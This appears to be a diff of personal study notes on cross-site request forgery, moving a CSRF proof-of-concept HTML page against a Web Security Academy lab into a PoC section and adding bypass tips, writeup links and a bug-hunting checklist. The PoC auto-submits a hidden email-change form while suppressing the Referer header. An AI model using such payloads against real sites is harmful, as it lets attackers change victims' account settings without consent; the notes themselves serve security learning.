@@ -1,7 +1,4 @@
 # CSRF (Cross-Site Request Forgery)
-
-  
-
 ## What is CSRF?
 
   
@@ -63,10 +60,7 @@ Chaining involves combining CSRF with other vulnerabilities to increase impact. 
 
 ## Escalating the Risk of CSRF
 
-  
-
 To escalate the risk of a CSRF attack:
-
 1. **Target High-Privilege Accounts**: Attacks aimed at admin or superuser accounts can cause severe damage (e.g., altering site configurations, deleting user data).
 
 2. **Sensitive Operations**: Exploiting CSRF in actions like financial transactions, password changes, or deleting resources makes the attack more impactful.
@@ -201,56 +195,6 @@ $newEmail = $_POST['newEmail'];
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-```
-<html>
-<head>
-    <meta name="referrer" content="never">
-</head>
-<body>
-    <form action="https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account/change-email" method="POST">
-        <input type="hidden" name="email" value="tst@gmail.com" />
-        <input type="submit" value="Submit request" />
-    </form>
-    <script>
-        history.pushState('', '', '/?https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account?id=wiener');
-        document.forms[0].submit();
-    </script>
-</body>
-</html>
-
-``` 
-a sample of poc of csrf that checks for refereal header 
-
 ## CSRF Proof of Concept (PoC)
 ### 1
 #### Objective
@@ -342,10 +286,41 @@ here is the code used
 
 
 
+### 2 a sample of poc of csrf that checks for refereal header 
+
+
+```
+<html>
+<head>
+    <meta name="referrer" content="never">
+</head>
+<body>
+    <form action="https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="tst@gmail.com" />
+        <input type="submit" value="Submit request" />
+    </form>
+    <script>
+        history.pushState('', '', '/?https://0a5e0026030b4bec819ea24400d600f5.web-security-academy.net/my-account?id=wiener');
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+``` 
+
 ## tips
 tips 
 - may be checking for referrer header  [writeup ](https://flex0geek.blogspot.com/2019/04/critical-ibm-bypass-csrf-protection.html)
 - or origin 
 - if is getting the request as JSON he may be checking the content type 
 - or he can accept any content type try to manipulate the content type 
-	
+- csrf in json [writeup](https://dant0x65.medium.com/json-csrf-a1594955dd75)
+- [csrf and deal with CORS ](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)
+# Finding Your First CSRF!
+1. Spot the state-changing actions on the application and keep a note on
+their locations and functionality.
+2. Check these functionalities for CSRF protection. If you can’t spot any
+protections, you might have found a vulnerability!
+3. If any CSRF protection mechanisms are present, try to bypass the protection by using the protection-bypass techniques mentioned in this chapter.
+4. Confirm the vulnerability by crafting a malicious HTML page and visiting that page to see if the action has executed.
+5. Think of strategies for delivering your payload to end users. 6. Draft your first CSRF report
